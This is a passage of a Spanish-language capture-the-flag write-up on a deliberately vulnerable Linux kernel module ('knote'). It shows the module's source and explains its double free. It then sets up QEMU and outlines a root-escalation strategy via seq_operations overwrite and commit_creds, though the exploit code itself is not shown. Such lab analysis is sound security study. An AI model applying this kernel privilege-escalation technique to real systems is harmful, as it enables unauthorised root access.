+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx]) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk8">encrypt_func</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">len</span><span class="mtk1">);</span>  
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">         </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_DECRYPT:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx]) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk8">decrypt_func</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">len</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> __init </span><span class="mtk8">init_knote</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">) {</span>
+<span class="mtk1">    major </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">register_chrdev</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, DEVICE_NAME, </span><span class="mtk5">&amp;</span><span class="mtk1">knote_fops);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span> <span class="mtk1">(major </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
+
+<span class="mtk1">    knote_class </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">class_create</span><span class="mtk1">(THIS_MODULE, CLASS_NAME);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">IS_ERR</span><span class="mtk1">(knote_class)) {</span>
+<span class="mtk1">        </span><span class="mtk8">unregister_chrdev</span><span class="mtk1">(major, DEVICE_NAME);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    knote_device </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">device_create</span><span class="mtk1">(knote_class, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk8">MKDEV</span><span class="mtk1">(major, </span><span class="mtk6">0</span><span class="mtk1">), </span><span class="mtk6">0</span><span class="mtk1">, DEVICE_NAME);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">IS_ERR</span><span class="mtk1">(knote_device))</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">class_destroy</span><span class="mtk1">(knote_class);</span>
+<span class="mtk1">        </span><span class="mtk8">unregister_chrdev</span><span class="mtk1">(major, DEVICE_NAME);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> __exit </span><span class="mtk8">exit_knote</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk8">device_destroy</span><span class="mtk1">(knote_class, </span><span class="mtk8">MKDEV</span><span class="mtk1">(major, </span><span class="mtk6">0</span><span class="mtk1">));</span>
+<span class="mtk1">    </span><span class="mtk8">class_unregister</span><span class="mtk1">(knote_class);</span>
+<span class="mtk1">    </span><span class="mtk8">class_destroy</span><span class="mtk1">(knote_class);</span>
+<span class="mtk1">    </span><span class="mtk8">unregister_chrdev</span><span class="mtk1">(major, DEVICE_NAME);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk8">module_init</span><span class="mtk1">(init_knote);</span>
+<span class="mtk8">module_exit</span><span class="mtk1">(exit_knote);</span>
+</code></pre></div><p>Parece un desafío de explotación del <em>heap</em> pero en el kernel. El asignador de memoria es SLAB, que está bien documentado <a href="https://www.kernel.org/doc/gorman/html/understand/understand011.html">aquí</a> y <a href="https://hammertux.github.io/slab-allocator">aquí</a></p><p>El módulo define estas estructuras:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">struct</span><span class="mtk1"> knote {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">encrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>  
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">decrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> knote_user {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> idx;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> data;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">enum</span><span class="mtk1"> knote_ioctl_cmd {</span>
+<span class="mtk1">    KNOTE_CREATE </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1337</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_DELETE </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1338</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_READ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1339</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_ENCRYPT </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">133a</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_DECRYPT </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">133b</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> knote </span><span class="mtk5">*</span><span class="mtk1">knotes[</span><span class="mtk6">10</span><span class="mtk1">];</span>
+</code></pre></div><p>Es importante observar que <code>knote</code> es una estructura de <code>0x20</code> bytes y <code>knote_user</code> es una estructura de <code>0x18</code> bytes. Podemos asignar hasta 10 notas con hasta <code>0x20</code> bytes de datos.</p><h3 id="función-de-asignación">Función de asignación</h3><p>Mediante el comando <code>KNOTE_CREATE</code>, ingresaremos esta opción:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_CREATE:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.len </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1">)</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kmalloc</span><span class="mtk1">(ku.len, GFP_KERNEL);</span>
+<span class="mtk1">            knotes[ku.idx] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kmalloc</span><span class="mtk1">(</span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> knote), GFP_KERNEL);</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(data </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> knotes[ku.idx] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">ENOMEM;</span>
+<span class="mtk1">            }</span>
+
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">data </span><span class="mtk5">=</span><span class="mtk1"> data;</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">len </span><span class="mtk5">=</span><span class="mtk1"> ku.len;</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">copy_from_user</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, ku.data, ku.len)) {</span>  
+<span class="mtk1">                </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]-&gt;data);</span>
+<span class="mtk1">                </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]);</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">encrypt_func </span><span class="mtk5">=</span><span class="mtk1"> knote_encrypt;</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">decrypt_func </span><span class="mtk5">=</span><span class="mtk1"> knote_decrypt;</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+</code></pre></div><p>Básicamente, podemos proporcionar datos para crear una nueva nota. Hay algo extraño porque si <code>copy_from_user</code> da un error, entonces el <em>chunk</em> se libera.</p><h3 id="función-de-liberación">Función de liberación</h3><p>Al usar el comando <code>KNOTE_DELETE</code>, tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_DELETE:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx]) {</span>  
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]);</span>
+<span class="mtk1">            knotes[ku.idx] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+</code></pre></div><p>Simplemente verifica que la nota existe y luego usa <code>kfree</code> para liberar tanto la nota como el <em>chunk</em> de datos. Al final, elimina el puntero usando <code>knotes[ku.idx] = NULL</code>.</p><p>Si comparamos este procedimiento con el de <code>KNOTE_CREATE</code>, el módulo no elimina el puntero. Por lo tanto, podemos obtener un <em>double free</em> llamando a <code>KNOTE_CREATE</code> con un error y luego usando <code>KNOTE_DELETE</code>.</p><h3 id="función-de-información">Función de información</h3><p>Este es <code>KNOTE_READ</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_READ:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx] </span><span class="mtk5">||</span><span class="mtk1"> ku.len </span><span class="mtk5">&gt;</span><span class="mtk1"> knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">len) {</span>  
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">copy_to_user</span><span class="mtk1">(ku.data, knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, ku.len)) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+</code></pre></div><p>Nos permite copiar los datos de la nota en nuestra variable de usuario.</p><p>Hay dos funciones más que permiten cifrar/descifrar el campo de datos, pero no son relevantes para la explotación.</p><h2 id="configuración-del-entorno">Configuración del entorno</h2><p>Necesité modificar un poco el <em>script</em> <code>qemu-cmd</code> para que se ejecute (por ejemplo, tuve que quitar la opción <code>-no-kvm</code> (creo que ya está deshabilitada de forma predeterminada):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk8">qemu-system-x86_64</span><span class="mtk1"> </span><span class="mtk6">-s</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-m</span><span class="mtk1"> </span><span class="mtk6">128</span><span class="mtk4">M</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-nographic</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-kernel</span><span class="mtk1"> </span><span class="mtk4">bzImage</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-append</span><span class="mtk1"> </span><span class="mtk4">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk6">\</span>  
+<span class="mtk1">  </span><span class="mtk6">-monitor</span><span class="mtk1"> </span><span class="mtk4">/dev/null</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-initrd</span><span class="mtk1"> </span><span class="mtk4">rootfs.img</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-cpu</span><span class="mtk1"> </span><span class="mtk4">qemu64</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk1">  </span><span class="mtk6">-smp</span><span class="mtk1"> </span><span class="mtk4">cores=</span><span class="mtk6">2</span>
+</code></pre></div><p>Además, agregué <code>-s</code> para habilitar la depuración en el puerto 1234 y eliminé el <code>timeout --foreground 35</code>, dado que esto solo importará al ejecutar el <em>exploit</em> en la instancia remota.</p><p>Para probar el <em>exploit</em> de kernel, descomprimiremos el sistema de archivos (<code>rootfs.img</code>), agregaremos el <em>exploit</em> compilado y comprimiremos nuevamente el sistema de archivos antes de ejecutar <code>qemu</code>.</p><p>En primer lugar, descomprimimos el sistema de archivos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ls</span>
+bzImage  qemu-cmd  rootfs.img
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">rootfs.img</span>
+rootfs.img: ASCII cpio archive (SVR4 with no CRC)  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">mkdir</span> rootfs
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">rootfs</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cpio</span> -i &lt; <span class="mtku">../rootfs.img</span>
+2077 blocks
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ls</span>
+<span class="code-blue">bin</span>      <span class="code-blue">dev</span>  flag  <span class="code-green">init</span>      <span class="code-blue">proc</span>      <span class="code-blue">sbin</span>  <span class="code-blue">tmp</span>
+bzImage  <span class="code-blue">etc</span>  <span class="code-blue">home</span>  knote.ko  qemu-cmd  <span class="code-blue">sys</span>   <span class="code-blue">usr</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">flag</span>
+&lt;FLAG WILL BE HERE&gt;
+</code></pre></div><p>Ahora podemos usar un <em>script</em> como este (<code>go.sh</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk8">musl-gcc</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">solve</span><span class="mtk1"> </span><span class="mtk6">-static</span><span class="mtk1"> </span><span class="mtk4">../solve.c</span>
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">solve</span><span class="mtk1"> </span><span class="mtk4">rootfs</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">rootfs</span>
+
+<span class="mtk8">find</span><span class="mtk1"> </span><span class="mtk4">.</span><span class="mtk1"> </span><span class="mtk6">-print0</span><span class="mtk1"> </span><span class="mtk6">\</span>
+<span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">cpio</span><span class="mtk1"> </span><span class="mtk6">--null</span><span class="mtk1"> </span><span class="mtk6">-ov</span><span class="mtk1"> </span><span class="mtk6">--format=newc</span><span class="mtk1"> </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null</span><span class="mtk1"> </span><span class="mtk6">\</span>  
+<span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk6">-9</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">../rootfs.img</span>
+
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">..</span>
+<span class="mtk8">sh</span><span class="mtk1"> </span><span class="mtk4">qemu-cmd</span>
+</code></pre></div><p>Y ya podemos comenzar a crear el <em>exploit</em>.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>El error fue visto antes. Si ingresamos una dirección no válida en la estructura <code>knote_user</code>, el módulo libera tanto el fragmento de datos como la estructura <code>knote</code>, pero no elimina el puntero a la estructura. Por lo tanto, con la opción <code>KNOTE_FREE</code> podemos liberar nuevamente esta estructura porque el puntero todavía existe. Es decir, podemos lograr una vulnerabilidad <em>double free</em>.</p><p>Es común en los <em>exploits</em> de kernel que implican el <em>heap</em> buscar estructuras que se ajusten en una determinada caché (esta vez, <code>kmalloc-32</code>). Algunas de las estructuras útiles de kernel que se pueden usar para la explotación se enumeran en <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">este artículo</a> (aunque está en japonés). Se pueden encontrar más recursos sobre explotación de kernel en <a href="https://github.com/xairy/linux-kernel-exploitation">linux-kernel-exploitation</a>.</p><p>En <code>kmalloc-32</code>, hay una estructura útil llamada <code>seq_operations</code> que tiene esta forma:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">struct</span><span class="mtk1"> seq_operations {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">start) (</span><span class="mtk7 mtki">struct</span><span class="mtk1"> seq_file </span><span class="mtk5">*</span><span class="mtk1">m, </span><span class="mtk7 mtki">loff_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pos);</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">stop) (</span><span class="mtk7 mtki">struct</span><span class="mtk1"> seq_file </span><span class="mtk5">*</span><span class="mtk1">m, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">v);</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">next) (</span><span class="mtk7 mtki">struct</span><span class="mtk1"> seq_file </span><span class="mtk5">*</span><span class="mtk1">m, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">v, </span><span class="mtk7 mtki">loff_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pos);</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">show) (</span><span class="mtk7 mtki">struct</span><span class="mtk1"> seq_file </span><span class="mtk5">*</span><span class="mtk1">m, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">v);</span>
+<span class="mtk1">};</span>
+</code></pre></div><p>Básicamente, contiene 4 punteros a funciones que se llaman cuando se activan ciertas operaciones. Con la vulnerabilidad <em>double free</em>, podremos asignar esta estructura <code>seq_operations</code> y sobrescribirla con otra estructura en el mismo lugar, para que podamos agregar punteros arbitrarios en la esrtuctura <code>seq_operations</code>.</p><p>Como no hay SMEP, SMAP y KPTI, simplemente podemos agregar un poco de <em>shellcode</em> para regresar a <em>userland</em> y decirle al kernel que nos haga <code>root</code> y ejecute una <em>shell</em>. Para eso, necesitaremos encontrar la dirección de <code>prepare_kernel_cred</code> y <code>commit_creds</code>, que están disponibles en <code>/proc/kallsyms</code>. Modificaremos el archivo <code>init</code> para iniciar sesión como <code>root</code>, para poder leer los símbolos del kernel, agregando <code>setsid cttyhack setuidgid 0 /bin/sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
+
+<span class="mtk8">chown</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk4">:0</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">/</span>
+<span class="mtk8">chown</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1"> </span><span class="mtk4">/home/user</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">400</span><span class="mtk1"> </span><span class="mtk4">/flag</span>
+
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">proc</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/proc</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">sysfs</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/sys</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">devtmpfs</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/dev</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">tmpfs</span><span class="mtk1"> </span><span class="mtk4">tmpfs</span><span class="mtk1"> </span><span class="mtk4">/tmp</span>
+
+<span class="mtk8">sleep</span><span class="mtk1"> </span><span class="mtk6">1</span>
+
+<span class="mtk8">insmod</span><span class="mtk1"> </span><span class="mtk4">/knote.ko</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">744</span><span class="mtk1"> </span><span class="mtk4">/dev/knote</span>
+<span class="mtk8">dmesg</span><span class="mtk1"> </span><span class="mtk6">-n</span><span class="mtk1"> </span><span class="mtk6">1</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk6">777</span><span class="mtk1"> </span><span class="mtk4">/tmp/</span>
+
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">/home/user</span>
+<span class="mtk8">setsid</span><span class="mtk1"> </span><span class="mtk4">cttyhack</span><span class="mtk1"> </span><span class="mtk4">setuidgid</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk4">/bin/sh</span>  
+<span class="mtk8">cttyhack</span><span class="mtk1"> </span><span class="mtk4">su</span><span class="mtk1"> </span><span class="mtk6">-s</span><span class="mtk1"> </span><span class="mtk4">/bin/sh</span><span class="mtk1"> </span><span class="mtk4">user</span>
+<span class="mtk8">poweroff</span><span class="mtk1"> </span><span class="mtk6">-f</span>
